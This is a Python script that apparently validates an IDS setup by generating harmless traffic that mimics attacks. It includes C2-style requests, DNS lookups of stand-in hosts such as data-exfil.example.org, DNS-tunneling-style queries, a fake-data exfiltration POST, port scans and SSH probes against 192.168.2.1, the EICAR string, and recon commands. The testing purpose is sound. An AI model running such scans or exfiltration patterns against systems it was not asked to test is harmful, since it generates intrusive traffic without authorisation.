"""WardSOAR Threat Simulation Script.

Generates REAL network traffic and local artifacts that trigger Suricata IDS
rules and WardSOAR forensic analysis. All tests are safe and commonly used
for IDS/IPS validation.

Usage:
    python scripts/simulate_threats.py          # Interactive menu
    python scripts/simulate_threats.py --auto   # Run all simulations automatically

Requirements: requests (pip install requests)
"""

from __future__ import annotations

import argparse
import os
import socket
import subprocess
import sys
import tempfile
import time
from datetime import datetime

# Fix Windows terminal encoding
if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

try:
    import requests
except ImportError:
    print("ERROR: 'requests' is required. Install with: pip install requests")
    sys.exit(1)

# ──────────────────────────────────────────────────────────────────────
# Colors for terminal output
# ──────────────────────────────────────────────────────────────────────
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"


def banner() -> None:
    print(f"""
{CYAN}{BOLD}==========================================================
         WardSOAR -- Threat Simulation Script
         Safe IDS/IPS testing -- no real malware
=========================================================={RESET}
""")


def log_test(name: str) -> None:
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  {YELLOW}[{ts}]{RESET} {BOLD}{name}{RESET}")


def log_ok(msg: str) -> None:
    print(f"    {GREEN}✓{RESET} {msg}")


def log_fail(msg: str) -> None:
    print(f"    {RED}✗{RESET} {msg}")


# ──────────────────────────────────────────────────────────────────────
# 1. HTTP-based tests — trigger ET rules via testmynids.org
# ──────────────────────────────────────────────────────────────────────

def test_http_malware_ua() -> None:
    """HTTP request with malicious user-agent (triggers ET MALWARE rules)."""
    log_test("HTTP — Malicious User-Agent (simulated malware beacon)")
    malicious_uas = [
        "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 Ncat",
        "Wget/1.21.3",
        "curl/7.88.1",
        "python-requests/2.31.0",
    ]
    for ua in malicious_uas:
        try:
            r = requests.get(
                "http://testmynids.org/uid/index.html",
                headers={"User-Agent": ua},
                timeout=5,
            )
            log_ok(f"UA: {ua[:40]}... → HTTP {r.status_code}")
        except Exception as e:
            log_fail(f"UA: {ua[:40]}... → {e}")


def test_http_exe_download() -> None:
    """Simulate downloading an executable (triggers ET POLICY rules)."""
    log_test("HTTP — Simulated EXE download (ET POLICY)")
    try:
        r = requests.get(
            "http://testmynids.org/uid/index.html",
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Accept": "application/x-msdownload",
            },
            timeout=5,
        )
        log_ok(f"Simulated .exe download request → HTTP {r.status_code}")
    except Exception as e:
        log_fail(f"EXE download simulation failed: {e}")


def test_http_c2_patterns() -> None:
    """HTTP requests mimicking C2 communication patterns."""
    log_test("HTTP — C2 communication patterns")
    c2_urls = [
        "http://testmynids.org/uid/index.html",
        "http://testmynids.org/uid/index.html?cmd=whoami",
        "http://testmynids.org/uid/index.html?bot=check_in",
    ]
    for url in c2_urls:
        try:
            r = requests.get(url, timeout=5)
            log_ok(f"C2 pattern: {url.split('?')[-1][:30]} → HTTP {r.status_code}")
        except Exception as e:
            log_fail(f"C2 request failed: {e}")


def test_http_powershell_ua() -> None:
    """HTTP request with PowerShell user-agent (triggers ET INFO rules)."""
    log_test("HTTP — PowerShell User-Agent (ET INFO)")
    try:
        r = requests.get(
            "http://testmynids.org/uid/index.html",
            headers={
                "User-Agent": (
                    "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-GB) "
                    "WindowsPowerShell/5.1.26100.7920"
                ),
            },
            timeout=5,
        )
        log_ok(f"PowerShell UA request → HTTP {r.status_code}")
    except Exception as e:
        log_fail(f"PowerShell UA request failed: {e}")


# ──────────────────────────────────────────────────────────────────────
# 2. DNS-based tests — trigger ET DNS rules
# ──────────────────────────────────────────────────────────────────────

def test_dns_suspicious() -> None:
    """DNS lookups for suspicious TLDs and known test domains."""
    log_test("DNS — Suspicious domain lookups (ET DNS)")
    test_domains = [
        "testmynids.org",
        "malware.testcategory.com",
        "evil.example.com",
        "c2-server.example.net",
        "data-exfil.example.org",
    ]
    for domain in test_domains:
        try:
            ip = socket.gethostbyname(domain)
            log_ok(f"DNS resolve: {domain} → {ip}")
        except socket.gaierror:
            log_ok(f"DNS resolve: {domain} → NXDOMAIN (expected, still triggers rule)")


def test_dns_txt_query() -> None:
    """DNS TXT queries (often used for C2 tunneling, triggers ET DNS rules)."""
    log_test("DNS — TXT record queries (C2 tunneling pattern)")
    try:
        result = subprocess.run(
            ["nslookup", "-type=TXT", "testmynids.org"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        log_ok("DNS TXT query sent for testmynids.org")
    except Exception as e:
        log_fail(f"DNS TXT query failed: {e}")


# ──────────────────────────────────────────────────────────────────────
# 3. Port scanning — trigger ET SCAN rules
# ──────────────────────────────────────────────────────────────────────

def test_port_scan() -> None:
    """Quick port scan on localhost (triggers ET SCAN if Suricata sees it)."""
    log_test("SCAN — Quick port probe on common ports")
    target = "192.168.2.1"  # pfSense, Suricata will see it
    ports = [21, 22, 23, 25, 80, 110, 143, 443, 445, 3389, 8080, 8443]
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            result = s.connect_ex((target, port))
            status = "open" if result == 0 else "closed"
            s.close()
            log_ok(f"Port {port:>5} → {status}")
        except Exception:
            log_ok(f"Port {port:>5} → timeout")


def test_syn_patterns() -> None:
    """Multiple rapid connection attempts (triggers scan detection)."""
    log_test("SCAN — Rapid connection attempts (scan pattern)")
    target = "192.168.2.1"
    for port in range(8000, 8020):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect_ex((target, port))
            s.close()
        except Exception:
            pass
    log_ok("20 rapid port probes sent (8000-8019)")


# ──────────────────────────────────────────────────────────────────────
# 4. EICAR test file — triggers antivirus and file-based rules
# ──────────────────────────────────────────────────────────────────────

def test_eicar_download() -> None:
    """Download EICAR test file over HTTP (triggers ET MALWARE rules)."""
    log_test("EICAR — Download test virus file over HTTP")
    # EICAR test string — universally recognized as harmless test pattern
    eicar_url = "http://www.eicar.org/download/eicar.com.txt"
    try:
        r = requests.get(eicar_url, timeout=10)
        if "EICAR" in r.text or r.status_code == 200:
            log_ok(f"EICAR download attempted → HTTP {r.status_code}")
        else:
            log_ok(f"EICAR download blocked (expected) → HTTP {r.status_code}")
    except Exception as e:
        log_ok(f"EICAR download blocked/failed (expected): {e}")


def test_eicar_local() -> None:
    """Create EICAR test file locally (triggers Sysmon file monitoring)."""
    log_test("EICAR — Create local test virus file (Sysmon trigger)")
    # Standard EICAR test string
    eicar = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    temp_dir = tempfile.gettempdir()
    eicar_path = os.path.join(temp_dir, "eicar_test_wardsoar.com")
    try:
        with open(eicar_path, "w") as f:
            f.write(eicar)
        log_ok(f"EICAR file created: {eicar_path}")
        time.sleep(2)  # Let Sysmon detect it
        os.remove(eicar_path)
        log_ok("EICAR file removed after detection window")
    except Exception as e:
        log_fail(f"EICAR local test failed: {e}")


# ──────────────────────────────────────────────────────────────────────
# 5. Suspicious process activity — triggers forensic analysis
# ──────────────────────────────────────────────────────────────────────

def test_suspicious_powershell() -> None:
    """Run PowerShell with suspicious-looking (but harmless) commands."""
    log_test("PROCESS — Suspicious PowerShell patterns (Sysmon)")
    commands = [
        'powershell -Command "Write-Output WARDSOAR_TEST_ENCODED"',
        'powershell -Command "[System.Net.Dns]::GetHostName()"',
        'powershell -Command "Get-Process | Select-Object -First 1"',
    ]
    for cmd in commands:
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10,
                shell=True,
            )
            log_ok(f"PS command executed: {cmd[22:50]}...")
        except Exception as e:
            log_fail(f"PS command failed: {e}")


def test_suspicious_network_tool() -> None:
    """Use network reconnaissance tools (triggers Sysmon network events)."""
    log_test("PROCESS — Network recon tools (Sysmon)")
    commands = [
        ("ipconfig /all", "ipconfig"),
        ("netstat -an", "netstat"),
        ("arp -a", "arp table"),
        ("nslookup testmynids.org", "DNS lookup"),
    ]
    for cmd, desc in commands:
        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=10, shell=True)
            log_ok(f"Recon tool: {desc}")
        except Exception:
            log_fail(f"Recon tool failed: {desc}")


# ──────────────────────────────────────────────────────────────────────
# 6. Simulated data exfiltration patterns
# ──────────────────────────────────────────────────────────────────────

def test_data_exfil_http() -> None:
    """HTTP POST with large body simulating data exfiltration."""
    log_test("EXFIL — Large HTTP POST (data exfiltration pattern)")
    fake_data = "WARDSOAR_TEST_" * 500  # ~7KB of fake "exfiltrated" data
    try:
        r = requests.post(
            "http://testmynids.org/uid/index.html",
            data=fake_data,
            headers={"Content-Type": "application/octet-stream"},
            timeout=10,
        )
        log_ok(f"Large POST sent ({len(fake_data)} bytes) → HTTP {r.status_code}")
    except Exception as e:
        log_fail(f"Exfil simulation failed: {e}")


def test_data_exfil_dns() -> None:
    """Long DNS subdomain queries simulating DNS exfiltration."""
    log_test("EXFIL — DNS tunneling pattern (long subdomain queries)")
    encoded_chunks = [
        "dGVzdGRhdGExMjM0NTY3ODk.exfil.example.com",
        "c2Vuc2l0aXZlZGF0YWhlcmU.exfil.example.com",
        "bW9yZWRhdGF0b2V4ZmlsdA.exfil.example.com",
    ]
    for domain in encoded_chunks:
        try:
            socket.gethostbyname(domain)
        except socket.gaierror:
            pass
        log_ok(f"DNS exfil query: {domain[:35]}...")


# ──────────────────────────────────────────────────────────────────────
# 7. Brute-force simulation
# ──────────────────────────────────────────────────────────────────────

def test_ssh_brute_pattern() -> None:
    """Multiple rapid SSH connection attempts (triggers ET SCAN / brute-force)."""
    log_test("BRUTE — Rapid SSH connection attempts")
    target = "192.168.2.1"
    for i in range(5):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target, 22))
            s.send(b"SSH-2.0-OpenSSH_WARDSOAR_TEST\r\n")
            s.recv(256)
            s.close()
        except Exception:
            pass
        log_ok(f"SSH attempt {i + 1}/5")
        time.sleep(0.2)


# ──────────────────────────────────────────────────────────────────────
# 8. Encrypted/TLS anomalies
# ──────────────────────────────────────────────────────────────────────

def test_tls_to_suspicious_port() -> None:
    """TLS connection to non-standard port (triggers ET POLICY rules)."""
    log_test("TLS — Connection to non-standard ports")
    try:
        r = requests.get("https://testmynids.org", timeout=5, verify=False)
        log_ok(f"HTTPS to testmynids.org → HTTP {r.status_code}")
    except Exception as e:
        log_ok(f"HTTPS attempt (may fail, still triggers rule): {type(e).__name__}")


# ──────────────────────────────────────────────────────────────────────
# Scenario runners
# ──────────────────────────────────────────────────────────────────────

ALL_TESTS = [
    ("HTTP — Malicious User-Agents", test_http_malware_ua),
    ("HTTP — EXE Download Simulation", test_http_exe_download),
    ("HTTP — C2 Communication Patterns", test_http_c2_patterns),
    ("HTTP — PowerShell User-Agent", test_http_powershell_ua),
    ("DNS — Suspicious Domain Lookups", test_dns_suspicious),
    ("DNS — TXT Record Queries", test_dns_txt_query),
    ("SCAN — Port Probe", test_port_scan),
    ("SCAN — Rapid Connection Pattern", test_syn_patterns),
    ("EICAR — HTTP Download", test_eicar_download),
    ("EICAR — Local File Creation", test_eicar_local),
    ("PROCESS — Suspicious PowerShell", test_suspicious_powershell),
    ("PROCESS — Network Recon Tools", test_suspicious_network_tool),
    ("EXFIL — Large HTTP POST", test_data_exfil_http),
    ("EXFIL — DNS Tunneling Pattern", test_data_exfil_dns),
    # DISABLED: SSH brute test triggers sshguard which blocks WardSOAR SSH streamer
    # ("BRUTE — SSH Connection Attempts", test_ssh_brute_pattern),
    ("TLS — Non-standard Port", test_tls_to_suspicious_port),
]


def run_all(delay: float = 3.0) -> None:
    """Run all simulations with delay between each."""
    print(f"\n{CYAN}Running all {len(ALL_TESTS)} simulations with {delay}s delay...{RESET}\n")
    for i, (name, func) in enumerate(ALL_TESTS, 1):
        print(f"\n{BOLD}[{i}/{len(ALL_TESTS)}] {name}{RESET}")
        print("─" * 50)
        func()
        if i < len(ALL_TESTS):
            time.sleep(delay)
    print(f"\n{GREEN}{BOLD}All simulations complete!{RESET}")
    print(f"Check WardSOAR for detected alerts.\n")


def interactive_menu() -> None:
    """Show interactive menu for selecting simulations."""
    while True:
        print(f"\n{BOLD}Select a simulation:{RESET}")
        print(f"  {CYAN} 0{RESET} — Run ALL simulations")
        for i, (name, _) in enumerate(ALL_TESTS, 1):
            print(f"  {CYAN}{i:2}{RESET} — {name}")
        print(f"  {CYAN} q{RESET} — Quit")

        choice = input(f"\n{BOLD}Choice: {RESET}").strip().lower()

        if choice == "q":
            print(f"\n{GREEN}Done.{RESET}\n")
            break
        elif choice == "0":
            run_all()
        elif choice.isdigit() and 1 <= int(choice) <= len(ALL_TESTS):
            idx = int(choice) - 1
            name, func = ALL_TESTS[idx]
            print(f"\n{BOLD}{name}{RESET}")
            print("─" * 50)
            func()
        else:
            print(f"{RED}Invalid choice.{RESET}")


def main() -> None:
    parser = argparse.ArgumentParser(description="WardSOAR Threat Simulation")
    parser.add_argument(
        "--auto", action="store_true", help="Run all simulations automatically"
    )
    parser.add_argument(
        "--delay", type=float, default=3.0, help="Delay between tests in auto mode (default: 3s)"
    )
    args = parser.parse_args()

    banner()

    print(f"{YELLOW}WARNING: This script generates REAL network traffic that will")
    print(f"trigger IDS alerts. All tests are SAFE (no actual malware).{RESET}")
    print(f"Suricata on pfSense must be running to detect these alerts.\n")

    if args.auto:
        run_all(delay=args.delay)
    else:
        interactive_menu()


if __name__ == "__main__":
    main()
